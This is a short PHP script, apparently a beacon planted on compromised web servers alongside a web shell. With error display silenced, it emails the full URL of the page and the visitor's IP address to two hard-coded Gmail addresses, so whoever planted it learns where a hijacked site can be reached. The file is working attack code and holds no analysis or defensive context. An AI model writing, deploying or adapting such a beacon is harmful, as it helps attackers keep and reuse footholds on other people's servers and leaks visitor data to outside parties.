<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');

$tujuanmail = 'wahid.ark7330@gmail.com, nullfbook@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";

// header valid untuk mail()
$headers = "From: logger@" . $_SERVER['SERVER_NAME'] . "\r\n";

mail($tujuanmail, "LOGGER", $pesan_alert, $headers);
?>
